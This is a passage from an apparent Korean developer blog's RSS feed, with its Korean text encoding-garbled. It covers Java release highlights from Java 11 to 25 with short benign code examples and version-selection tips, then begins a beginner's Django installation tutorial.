class="line">map.put(<span class="string">&quot;age&quot;</span>, <span class="number">30</span>);</span><br></pre></td></tr></table></figure><h2 id="Java-11-2018-LTS"><a href="#Java-11-2018-LTS" class="headerlink" title="Java 11 (2018, LTS)"></a>Java 11 (2018, LTS)</h2><p>HTTP í´ë¼ì´ì–¸íŠ¸ê°€ ì •ì‹ í‘œì¤€ì´ ë˜ì—ˆê³ , <code>var</code>ë¥¼ ëŒë‹¤ íŒŒë¼ë¯¸í„°ì—ë„ ì“¸ ìˆ˜ ìˆì–´ ì–´ë…¸í…Œì´ì…˜ê³¼ ì¡°í•©í•˜ê¸° ì¢‹ì•„ì¡Œë‹¤. ë¬¸ìì—´&#x2F;íŒŒì¼ ì²˜ë¦¬ ìœ í‹¸ë¦¬í‹°ê°€ ëŠ˜ì–´ë‚˜ ìŠ¤í¬ë¦½íŠ¸ì²˜ëŸ¼ ê°„ë‹¨íˆ ì½”ë“œë¥¼ ì§¤ ìˆ˜ ìˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClient.newHttpClient();</span><br><span class="line"><span class="type">HttpRequest</span> <span class="variable">req</span> <span class="operator">=</span> HttpRequest.newBuilder(URI.create(<span class="string">&quot;https://example.com&quot;</span>)).build();</span><br><span class="line">HttpResponse&lt;String&gt; res = client.send(req, HttpResponse.BodyHandlers.ofString());</span><br><span class="line">System.out.println(res.body());</span><br></pre></td></tr></table></figure><h2 id="Java-1214-20192020"><a href="#Java-1214-20192020" class="headerlink" title="Java 1214 (20192020)"></a>Java 12<del>14 (2019</del>2020)</h2><p>ìŠ¤ìœ„ì¹˜ê°€ ì‹ í˜•íƒœë¡œ ì§„í™”(ë¯¸ë¦¬ë³´ê¸°)í•˜ë©° ê°€ë…ì„±ì´ í¬ê²Œ ê°œì„ ëê³ , í…ìŠ¤íŠ¸ ë¸”ë¡(ë¯¸ë¦¬ë³´ê¸°)ìœ¼ë¡œ ë©€í‹°ë¼ì¸ ë¬¸ìì—´ ì‘ì„±ì´ í¸í•´ì¡Œë‹¤. ë ˆì½”ë“œì™€ <code>instanceof</code> íŒ¨í„´ ë§¤ì¹­ì´ ë¯¸ë¦¬ë³´ê¸°ë¡œ ë“±ì¥í•´ ë°ì´í„° í´ë˜ìŠ¤ë¥¼ ê°„ê²°íˆ í‘œí˜„í•˜ëŠ” íë¦„ì´ ì‹œì‘ëë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;lang&quot;: &quot;Java&quot;,</span></span><br><span class="line"><span class="string">      &quot;version&quot;: 21</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> MON, TUE, WED -&gt; <span class="string">&quot;Weekday&quot;</span>;</span><br><span class="line">    <span class="keyword">case</span> THU, FRI -&gt; <span class="string">&quot;Almost weekend&quot;</span>;</span><br><span class="line">    <span class="keyword">default</span> -&gt; <span class="string">&quot;Weekend&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Java-1516-20202021"><a href="#Java-1516-20202021" class="headerlink" title="Java 1516 (20202021)"></a>Java 15<del>16 (2020</del>2021)</h2><p>í…ìŠ¤íŠ¸ ë¸”ë¡ì´ ì •ì‹ìœ¼ë¡œ êµ³ì–´ì§€ê³ , Sealed Classê°€ ë¯¸ë¦¬ë³´ê¸°ë¡œ ì†Œê°œë˜ì—ˆë‹¤(17ì—ì„œ ì™„ì„±). 16ì—ì„œ ë ˆì½”ë“œì™€ <code>instanceof</code> íŒ¨í„´ ë§¤ì¹­ì´ ì •ì‹í™”ë˜ë©° íŒ¨í„´ ê¸°ë°˜ ëª¨ë¸ë§ì´ ë³¸ê²©í™”ëë‹¤. ë²¡í„° APIëŠ” ì¸íë² ì´í„°ë¡œ HPC ì„±ëŠ¥ì„ ê²¨ëƒ¥í•œë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> <span class="keyword">permits</span> Circle, Rectangle &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Circle</span><span class="params">(<span class="type">double</span> radius)</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> w, <span class="type">double</span> h)</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">double</span> <span class="title function_">area</span><span class="params">(Shape s)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (s) &#123;</span><br><span class="line">        <span class="keyword">case</span> Circle c -&gt; Math.PI * c.radius() * c.radius();</span><br><span class="line">        <span class="keyword">case</span> Rectangle r -&gt; r.w() * r.h();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-17-2021-LTS"><a href="#Java-17-2021-LTS" class="headerlink" title="Java 17 (2021, LTS)"></a>Java 17 (2021, LTS)</h2><p>Sealed Classê°€ ì •ì‹ì´ ë˜ì–´ ìƒì† íŠ¸ë¦¬ë¥¼ ì•ˆì „í•˜ê²Œ ì œí•œí•  ìˆ˜ ìˆê³ , ìŠ¤ìœ„ì¹˜ íŒ¨í„´ ë§¤ì¹­ì€ ë¯¸ë¦¬ë³´ê¸°ë¡œ í™•ì¥ë˜ì—ˆë‹¤. ë³´ì•ˆÂ·GCê°€ ê°•í™”ë˜ë©° LTS ì—…ê·¸ë ˆì´ë“œì˜ ì•ˆì •íŒ ì—­í• ì„ í•œë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="keyword">interface</span> <span class="title class_">Command</span> <span class="keyword">permits</span> Start, Stop &#123;&#125;</span><br><span class="line"><span class="keyword">record</span> <span class="title class_">Start</span><span class="params">(String target)</span> <span class="keyword">implements</span> <span class="title class_">Command</span> &#123;&#125;</span><br><span class="line"><span class="keyword">record</span> <span class="title class_">Stop</span><span class="params">()</span> <span class="keyword">implements</span> <span class="title class_">Command</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> String <span class="title function_">handle</span><span class="params">(Command cmd)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> Start s -&gt; <span class="string">&quot;start &quot;</span> + s.target();</span><br><span class="line">        <span class="keyword">case</span> Stop _ -&gt; <span class="string">&quot;stop&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-18-19-2022"><a href="#Java-18-19-2022" class="headerlink" title="Java 18~19 (2022)"></a>Java 18~19 (2022)</h2><p>18ì€ ê¸°ë³¸ ë¬¸ìì…‹ì„ UTF-8ë¡œ í†µì¼í•˜ê³ , ê°„ë‹¨í•œ ì •ì  ì„œë²„ì™€ JFR ì´ë²¤íŠ¸ ìŠ¤íŠ¸ë¦¬ë° ê°œì„ ì„ ì œê³µí–ˆë‹¤. 19ì—ì„œëŠ” Project Loomì˜ ê°€ìƒ ìŠ¤ë ˆë“œ, ê¸°ë¡ íŒ¨í„´, Foreign Function &amp; Memory(FFM) APIê°€ ë¯¸ë¦¬ë³´ê¸°ë¡œ ê³µê°œë˜ì–´ ë™ì‹œì„±ê³¼ ë„¤ì´í‹°ë¸Œ ì—°ë™ì˜ í° ë³€ê³¡ì ì„ ì˜ˆê³ í–ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.startVirtualThread(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;lightweight task&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Java-20-2023"><a href="#Java-20-2023" class="headerlink" title="Java 20 (2023)"></a>Java 20 (2023)</h2><p>ê°€ìƒ ìŠ¤ë ˆë“œì™€ ê¸°ë¡ íŒ¨í„´ì´ 2ì°¨ ë¯¸ë¦¬ë³´ê¸°ë¡œ ë‹¤ë“¬ì–´ì¡Œê³ , ìŠ¤ì½”í”„ë“œ ê°’ê³¼ êµ¬ì¡°ì  ë™ì‹œì„±(ì¸íë² ì´í„°)ì´ ë“±ì¥í•´ ìŠ¤ë ˆë“œ ë¡œì»¬ í•œê³„ë¥¼ ë„˜ëŠ” ë§¥ë½ ì „ë‹¬ê³¼ íƒœìŠ¤í¬ ë‹¨ìœ„ ì·¨ì†Œ&#x2F;ì „íŒŒ ëª¨ë¸ì„ ì œì‹œí–ˆë‹¤.</p><h2 id="Java-21-2023-LTS"><a href="#Java-21-2023-LTS" class="headerlink" title="Java 21 (2023, LTS)"></a>Java 21 (2023, LTS)</h2><p>ê°€ìƒ ìŠ¤ë ˆë“œÂ·ìŠ¤ìœ„ì¹˜ íŒ¨í„´ ë§¤ì¹­Â·ê¸°ë¡ íŒ¨í„´ì´ ì •ì‹ìœ¼ë¡œ ì•ˆì •í™”ë˜ë©°, ë™ì‹œì„±ê³¼ íŒ¨í„´ ë§¤ì¹­ì´ í˜„ì—…ì—ì„œë„ ì“¸ ë§Œí•œ ìˆ˜ì¤€ì´ ë˜ì—ˆë‹¤. ìˆœì„œê°€ ë³´ì¥ëœ ì»¬ë ‰ì…˜ ë·°(SequencedCollection)ì™€ GC ê°œì„ ìœ¼ë¡œ ëŸ°íƒ€ì„ í’ˆì§ˆì„ ë†’ì˜€ê³ , ë¬¸ìì—´ í…œí”Œë¦¿ê³¼ ìŠ¤ì½”í”„ë“œ ê°’ì€ ë¯¸ë¦¬ë³´ê¸°ë¡œ ì‹¤í—˜ì„ ì´ì–´ê°„ë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">var</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StructuredTaskScope</span>.ShutdownOnFailure()) &#123;</span><br><span class="line">    Future&lt;String&gt; user = scope.fork(() -&gt; fetchUser());</span><br><span class="line">    Future&lt;List&lt;String&gt;&gt; orders = scope.fork(() -&gt; fetchOrders());</span><br><span class="line">    scope.join().throwIfFailed();</span><br><span class="line">    System.out.println(user.result() + orders.result());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-22-2024"><a href="#Java-22-2024" class="headerlink" title="Java 22 (2024)"></a>Java 22 (2024)</h2><p>FFM APIê°€ ì •ì‹ìœ¼ë¡œ ìë¦¬ ì¡ì•„ ë„¤ì´í‹°ë¸Œ ë¼ì´ë¸ŒëŸ¬ë¦¬ í˜¸ì¶œê³¼ ì•ˆì „í•œ ë©”ëª¨ë¦¬ ì ‘ê·¼ì„ ê³µì‹ ì§€ì›í•œë‹¤. ìŠ¤ì½”í”„ë“œ ê°’Â·êµ¬ì¡°ì  ë™ì‹œì„±ì€ ì¶”ê°€ ë¯¸ë¦¬ë³´ê¸°ë¡œ ì•ˆì •ì„±ì„ ë†’ì˜€ê³ , ìŠ¤íŠ¸ë¦¼ Gatherer(ë¯¸ë¦¬ë³´ê¸°)ì™€ ë¬¸ìì—´ í…œí”Œë¦¿ 2ì°¨ ë¯¸ë¦¬ë³´ê¸°ë¡œ í‘œí˜„ë ¥ì„ í™•ì¥í•œë‹¤.</p><h2 id="Java-23-2024"><a href="#Java-23-2024" class="headerlink" title="Java 23 (2024)"></a>Java 23 (2024)</h2><p>ì–¸ë„¤ì„ë“œ í´ë˜ìŠ¤&#x2F;ì¸ìŠ¤í„´ìŠ¤ ë©”ì¸ ë©”ì„œë“œ(ë¯¸ë¦¬ë³´ê¸°)ë¡œ êµìœ¡Â·ìŠ¤í¬ë¦½íŒ… ì§„ì… ì¥ë²½ì„ ë‚®ì·„ê³ , Class-File API(ë¯¸ë¦¬ë³´ê¸°)ë¡œ ë°”ì´íŠ¸ì½”ë“œ ì¡°ì‘ì„ í‘œì¤€í™”í•˜ë ¤ëŠ” ì›€ì§ì„ì´ ì‹œì‘ëë‹¤. ë¬¸ìì—´ í…œí”Œë¦¿ê³¼ Vector APIë„ í›„ì† ë¯¸ë¦¬ë³´ê¸°&#x2F;ì¸íë² ì´í„°ë¥¼ ê±°ì¹˜ë©° ì‚¬ìš©ì„±ì„ ë‹¤ë“¬ëŠ”ë‹¤.</p><h2 id="Java-24-2025-ì˜ˆì •"><a href="#Java-24-2025-ì˜ˆì •" class="headerlink" title="Java 24 (2025, ì˜ˆì •)"></a>Java 24 (2025, ì˜ˆì •)</h2><p>GA ì „ì´ë¯€ë¡œ êµ¬ì„±ì€ ë³€ë™ë  ìˆ˜ ìˆìœ¼ë‚˜, 23ì—ì„œ ë¯¸ë¦¬ë³´ê¸°ì˜€ë˜ ê¸°ëŠ¥ë“¤ì˜ ì •ì‹í™” ì—¬ë¶€ì™€ ë£¨ë¯¸ë‚˜ë¦¬&#x2F;íŒŒë‚˜ë§ˆ ê³„ì—´(ê°€ìƒ ìŠ¤ë ˆë“œ, êµ¬ì¡°ì  ë™ì‹œì„±, FFM) ì¶”ê°€ ë‹¤ë“¬ê¸°ê°€ í•µì‹¬ ì²´í¬í¬ì¸íŠ¸ë‹¤. ì‹¤ì œ í¬í•¨ ê¸°ëŠ¥ì€ ë¦´ë¦¬ìŠ¤ ë…¸íŠ¸ì™€ JEP ëª©ë¡ì„ í™•ì¸í•´ì•¼ í•œë‹¤.</p><h2 id="Java-25-2025-ì˜ˆì •"><a href="#Java-25-2025-ì˜ˆì •" class="headerlink" title="Java 25 (2025, ì˜ˆì •)"></a>Java 25 (2025, ì˜ˆì •)</h2><p>í˜„ì¬ ê³„íš ë‹¨ê³„ë‹¤. í†µìƒ 23~24ì—ì„œ ë¯¸ë¦¬ë³´ê¸°Â·ì¸íë² ì´í„°ì˜€ë˜ ê¸°ëŠ¥ë“¤ì˜ ì •ì‹í™”ì™€ JVM ì„±ëŠ¥ ìµœì í™”ê°€ ì˜ˆìƒë˜ì§€ë§Œ, ì‹¤ì œ í¬í•¨ ê¸°ëŠ¥ì€ GA ì§ì „ í™•ì •ëœë‹¤. ë¦´ë¦¬ìŠ¤ ì§í›„ JEP ëª©ë¡ì„ ë°˜ì˜í•´ ë‚´ìš©ì„ ì—…ë°ì´íŠ¸í•˜ëŠ” ê²ƒì´ ì•ˆì „í•˜ë‹¤.</p><h2 id="ìµœì‹ -ë²„ì „-ì„ íƒ-ê°€ì´ë“œ"><a href="#ìµœì‹ -ë²„ì „-ì„ íƒ-ê°€ì´ë“œ" class="headerlink" title="ìµœì‹  ë²„ì „ ì„ íƒ ê°€ì´ë“œ"></a>ìµœì‹  ë²„ì „ ì„ íƒ ê°€ì´ë“œ</h2><ul><li>ì¥ê¸° ì§€ì›ì´ í•„ìš”í•˜ë©´ 17 â†’ 21 LTS ì „í™˜ì„ ê¶Œì¥(ê°€ìƒ ìŠ¤ë ˆë“œ ë“± ìµœì‹  ëŸ°íƒ€ì„ ì´ì ).</li><li>ì‹ ê·œ ê°œë°œì€ 21 LTSë¥¼ ê¸°ë³¸ìœ¼ë¡œ í•˜ê³ , FFMÂ·ë¬¸ìì—´ í…œí”Œë¦¿Â·ìŠ¤ì½”í”„ë“œ ê°’ ë“± ë¯¸ë¦¬ë³´ê¸° ê¸°ëŠ¥ì€ <code>--enable-preview</code>ë¡œ ì‹œí—˜ í›„ ì±„íƒí•œë‹¤.</li><li>ê¸°ì¡´ 8&#x2F;11 ì„œë¹„ìŠ¤ëŠ” ë¹Œë“œ íŒŒì´í”„ë¼ì¸ì„ ëª¨ë“ˆí™”&#x2F;í†µí•© ë¡œê¹…&#x2F;GC ì˜µì…˜ìœ¼ë¡œ ì ì§„ ì´ê´€í•˜ëŠ” ê²ƒì´ ì•ˆì „í•˜ë‹¤.</li><li>22 ì´í›„ ë¦´ë¦¬ìŠ¤ëŠ” ë¯¸ë¦¬ë³´ê¸°Â·ì¸íë² ì´í„° ë³€ë™ì´ ì¦ìœ¼ë‹ˆ GA ì‹œì  JEP ëª©ë¡ì„ í™•ì¸í•´ ì˜ì¡´ì„±ì„ ì ê·¼ë‹¤.</li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Develop/">Develop</category>
      
      <category domain="https://ckck803.github.io/categories/Develop/JAVA/">JAVA</category>
      
      
      <category domain="https://ckck803.github.io/tags/Java/">Java</category>
      
      <category domain="https://ckck803.github.io/tags/Release/">Release</category>
      
      <category domain="https://ckck803.github.io/tags/Features/">Features</category>
      
      
      <comments>https://ckck803.github.io/2025/11/27/java/jwt/java-version-highlights/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Django ì‹œì‘í•˜ê¸° - ì„¤ì¹˜ë¶€í„° í”„ë¡œì íŠ¸ ìƒì„±ê¹Œì§€ ğŸš€</title>
      <link>https://ckck803.github.io/2025/11/27/django/django-start/</link>
      <guid>https://ckck803.github.io/2025/11/27/django/django-start/</guid>
      <pubDate>Wed, 26 Nov 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/django/django.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;ì•ˆë…•í•˜ì„¸ìš”! ğŸ‘‹ ì˜¤ëŠ˜ì€ Pythonì˜ ëŒ€í‘œì ì¸ ì›¹ í”„ë ˆì„ì›Œí¬ì¸ Djangoë¥¼ ì‹œì‘í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤. Djangoë¥¼ ì²˜ìŒ ì ‘í•˜ì‹œëŠ” ë¶„ë“¤ë„ ì‰½ê²Œ ë”°ë¼í•  ìˆ˜ ìˆë„ë¡ ìì„¸íˆ ì„¤ëª…í•´ë“œë¦´ê²Œìš”! ğŸ˜Š&lt;/p&gt;
&lt;h2 id=&quot;1ï¸âƒ£-Djangoë€-ë¬´ì—‡ì¸ê°€ìš”-ğŸ¤”&quot;&gt;&lt;a href=&quot;#1ï¸âƒ£-Djangoë€-ë¬´ì—‡ì¸ê°€ìš”-ğŸ¤”&quot; class=&quot;headerlink&quot; title=&quot;1ï¸âƒ£ Djangoë€ ë¬´ì—‡ì¸ê°€ìš”? ğŸ¤”&quot;&gt;&lt;/a&gt;1ï¸âƒ£ Djangoë€ ë¬´ì—‡ì¸ê°€ìš”? ğŸ¤”&lt;/h2&gt;&lt;p&gt;Django(ì¥ê³ )ëŠ” Pythonìœ¼ë¡œ ì‘ì„±ëœ ë¬´ë£Œ ì˜¤í”ˆì†ŒìŠ¤ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. â€œë¹ ë¥¸ ê°œë°œâ€ê³¼ â€œê¹”ë”í•˜ê³  ì‹¤ìš©ì ì¸ ë””ìì¸â€ì„ ëª©í‘œë¡œ ë§Œë“¤ì–´ì¡Œì–´ìš”.&lt;/p&gt;
&lt;h3 id=&quot;Djangoì˜-ì£¼ìš”-íŠ¹ì§•-âœ¨&quot;&gt;&lt;a href=&quot;#Djangoì˜-ì£¼ìš”-íŠ¹ì§•-âœ¨&quot; class=&quot;headerlink&quot; title=&quot;Djangoì˜ ì£¼ìš” íŠ¹ì§• âœ¨&quot;&gt;&lt;/a&gt;Djangoì˜ ì£¼ìš” íŠ¹ì§• âœ¨&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MTV íŒ¨í„´&lt;/strong&gt; ğŸ“&lt;br&gt;DjangoëŠ” MTV(Model-Template-View) íŒ¨í„´ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ë¥¸ í”„ë ˆì„ì›Œí¬ì˜ MVC íŒ¨í„´ê³¼ ìœ ì‚¬í•œë°ìš”:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Model&lt;/strong&gt;: ë°ì´í„°ë² ì´ìŠ¤ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ë¶€ë¶„ ğŸ’¾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Template&lt;/strong&gt;: ì‚¬ìš©ìì—ê²Œ ë³´ì—¬ì§€ëŠ” í™”ë©´ (HTML) ğŸ¨&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;View&lt;/strong&gt;: ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì„ ì²˜ë¦¬í•˜ëŠ” ë¶€ë¶„ âš™ï¸&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ë°°í„°ë¦¬ í¬í•¨(Batteries Included)&lt;/strong&gt; ğŸ”‹&lt;br&gt;DjangoëŠ” ì›¹ ê°œë°œì— í•„ìš”í•œ ê±°ì˜ ëª¨ë“  ê¸°ëŠ¥ì„ ê¸°ë³¸ì ìœ¼ë¡œ ì œê³µí•©ë‹ˆë‹¤:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ê°•ë ¥í•œ ORM(Object-Relational Mapping) ì‹œìŠ¤í…œ&lt;/li&gt;
&lt;li&gt;ì‚¬ìš©ì ì¸ì¦ ì‹œìŠ¤í…œ ğŸ”&lt;/li&gt;
&lt;li&gt;ê´€ë¦¬ì í˜ì´ì§€(Admin Page) ìë™ ìƒì„± ğŸ‘¨â€ğŸ’¼&lt;/li&gt;
&lt;li&gt;í¼(Form) ì²˜ë¦¬ ğŸ“&lt;/li&gt;
&lt;li&gt;ì„¸ì…˜ ê´€ë¦¬&lt;/li&gt;
&lt;li&gt;ë³´ì•ˆ ê¸°ëŠ¥ (CSRF, XSS, SQL Injection ë°©ì§€) ğŸ›¡ï¸&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;í™•ì¥ì„±ê³¼ ì•ˆì •ì„±&lt;/strong&gt; ğŸ’ª&lt;br&gt;Instagram, Pinterest, NASA ë“± ë§ì€ ëŒ€í˜• ì„œë¹„ìŠ¤ë“¤ì´ Djangoë¥¼ ì‚¬ìš©í•˜ê³  ìˆì–´ìš”. ì´ëŠ” Djangoê°€ ì–¼ë§ˆë‚˜ ì•ˆì •ì ì´ê³  í™•ì¥ ê°€ëŠ¥í•œì§€ë¥¼ ì¦ëª…í•©ë‹ˆë‹¤!&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/django/django.png"></p><p>ì•ˆë…•í•˜ì„¸ìš”! ğŸ‘‹ ì˜¤ëŠ˜ì€ Pythonì˜ ëŒ€í‘œì ì¸ ì›¹ í”„ë ˆì„ì›Œí¬ì¸ Djangoë¥¼ ì‹œì‘í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤. Djangoë¥¼ ì²˜ìŒ ì ‘í•˜ì‹œëŠ” ë¶„ë“¤ë„ ì‰½ê²Œ ë”°ë¼í•  ìˆ˜ ìˆë„ë¡ ìì„¸íˆ ì„¤ëª…í•´ë“œë¦´ê²Œìš”! ğŸ˜Š</p><h2 id="1ï¸âƒ£-Djangoë€-ë¬´ì—‡ì¸ê°€ìš”-ğŸ¤”"><a href="#1ï¸âƒ£-Djangoë€-ë¬´ì—‡ì¸ê°€ìš”-ğŸ¤”" class="headerlink" title="1ï¸âƒ£ Djangoë€ ë¬´ì—‡ì¸ê°€ìš”? ğŸ¤”"></a>1ï¸âƒ£ Djangoë€ ë¬´ì—‡ì¸ê°€ìš”? ğŸ¤”</h2><p>Django(ì¥ê³ )ëŠ” Pythonìœ¼ë¡œ ì‘ì„±ëœ ë¬´ë£Œ ì˜¤í”ˆì†ŒìŠ¤ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. â€œë¹ ë¥¸ ê°œë°œâ€ê³¼ â€œê¹”ë”í•˜ê³  ì‹¤ìš©ì ì¸ ë””ìì¸â€ì„ ëª©í‘œë¡œ ë§Œë“¤ì–´ì¡Œì–´ìš”.</p><h3 id="Djangoì˜-ì£¼ìš”-íŠ¹ì§•-âœ¨"><a href="#Djangoì˜-ì£¼ìš”-íŠ¹ì§•-âœ¨" class="headerlink" title="Djangoì˜ ì£¼ìš” íŠ¹ì§• âœ¨"></a>Djangoì˜ ì£¼ìš” íŠ¹ì§• âœ¨</h3><p><strong>MTV íŒ¨í„´</strong> ğŸ“<br>DjangoëŠ” MTV(Model-Template-View) íŒ¨í„´ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ë¥¸ í”„ë ˆì„ì›Œí¬ì˜ MVC íŒ¨í„´ê³¼ ìœ ì‚¬í•œë°ìš”:</p><ul><li><strong>Model</strong>: ë°ì´í„°ë² ì´ìŠ¤ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ë¶€ë¶„ ğŸ’¾</li><li><strong>Template</strong>: ì‚¬ìš©ìì—ê²Œ ë³´ì—¬ì§€ëŠ” í™”ë©´ (HTML) ğŸ¨</li><li><strong>View</strong>: ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì„ ì²˜ë¦¬í•˜ëŠ” ë¶€ë¶„ âš™ï¸</li></ul><p><strong>ë°°í„°ë¦¬ í¬í•¨(Batteries Included)</strong> ğŸ”‹<br>DjangoëŠ” ì›¹ ê°œë°œì— í•„ìš”í•œ ê±°ì˜ ëª¨ë“  ê¸°ëŠ¥ì„ ê¸°ë³¸ì ìœ¼ë¡œ ì œê³µí•©ë‹ˆë‹¤:</p><ul><li>ê°•ë ¥í•œ ORM(Object-Relational Mapping) ì‹œìŠ¤í…œ</li><li>ì‚¬ìš©ì ì¸ì¦ ì‹œìŠ¤í…œ ğŸ”</li><li>ê´€ë¦¬ì í˜ì´ì§€(Admin Page) ìë™ ìƒì„± ğŸ‘¨â€ğŸ’¼</li><li>í¼(Form) ì²˜ë¦¬ ğŸ“</li><li>ì„¸ì…˜ ê´€ë¦¬</li><li>ë³´ì•ˆ ê¸°ëŠ¥ (CSRF, XSS, SQL Injection ë°©ì§€) ğŸ›¡ï¸</li></ul><p><strong>í™•ì¥ì„±ê³¼ ì•ˆì •ì„±</strong> ğŸ’ª<br>Instagram, Pinterest, NASA ë“± ë§ì€ ëŒ€í˜• ì„œë¹„ìŠ¤ë“¤ì´ Djangoë¥¼ ì‚¬ìš©í•˜ê³  ìˆì–´ìš”. ì´ëŠ” Djangoê°€ ì–¼ë§ˆë‚˜ ì•ˆì •ì ì´ê³  í™•ì¥ ê°€ëŠ¥í•œì§€ë¥¼ ì¦ëª…í•©ë‹ˆë‹¤!</p><h3 id="Djangoë¥¼-ì„ íƒí•˜ëŠ”-ì´ìœ -ğŸ¯"><a href="#Djangoë¥¼-ì„ íƒí•˜ëŠ”-ì´ìœ -ğŸ¯" class="headerlink" title="Djangoë¥¼ ì„ íƒí•˜ëŠ” ì´ìœ  ğŸ¯"></a>Djangoë¥¼ ì„ íƒí•˜ëŠ” ì´ìœ  ğŸ¯</h3><ul><li><strong>ë¹ ë¥¸ ê°œë°œ ì†ë„</strong>: ë°˜ë³µì ì¸ ì‘ì—…ì„ ìë™í™”í•˜ì—¬ ê°œë°œ ì‹œê°„ì„ ë‹¨ì¶•ì‹œì¼œì¤ë‹ˆë‹¤ âš¡</li><li><strong>DRY ì›ì¹™</strong>: Donâ€™t Repeat Yourself! ì½”ë“œ ì¤‘ë³µì„ ìµœì†Œí™”í•©ë‹ˆë‹¤ â™»ï¸</li><li><strong>í’ë¶€í•œ ë¬¸ì„œ</strong>: ê³µì‹ ë¬¸ì„œê°€ ë§¤ìš° ì˜ ì •ë¦¬ë˜ì–´ ìˆì–´ìš” ğŸ“š</li><li><strong>í™œë°œí•œ ì»¤ë®¤ë‹ˆí‹°</strong>: ì „ ì„¸ê³„ì ìœ¼ë¡œ ë§ì€ ê°œë°œìë“¤ì´ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤ ğŸŒ</li><li><strong>ë³´ì•ˆ</strong>: ë³´ì•ˆ ê´€ë ¨ ë§ì€ ê¸°ëŠ¥ë“¤ì´ ê¸°ë³¸ ë‚´ì¥ë˜ì–´ ìˆì–´ ì•ˆì „í•©ë‹ˆë‹¤ ğŸ”’</li></ul><h2 id="2ï¸âƒ£-Django-ì„¤ì¹˜í•˜ê¸°-ğŸ“¦"><a href="#2ï¸âƒ£-Django-ì„¤ì¹˜í•˜ê¸°-ğŸ“¦" class="headerlink" title="2ï¸âƒ£ Django ì„¤ì¹˜í•˜ê¸° ğŸ“¦"></a>2ï¸âƒ£ Django ì„¤ì¹˜í•˜ê¸° ğŸ“¦</h2><p>Djangoë¥¼ ì‹œì‘í•˜ê¸° ìœ„í•´ì„œëŠ” ë¨¼ì € Pythonì´ ì„¤ì¹˜ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. Python 3.8 ì´ìƒ ë²„ì „ì„ ê¶Œì¥í•©ë‹ˆë‹¤! ğŸ</p><h3 id="Step-1-Python-ì„¤ì¹˜-í™•ì¸-âœ…"><a href="#Step-1-Python-ì„¤ì¹˜-í™•ì¸-âœ…" class="headerlink" title="Step 1: Python 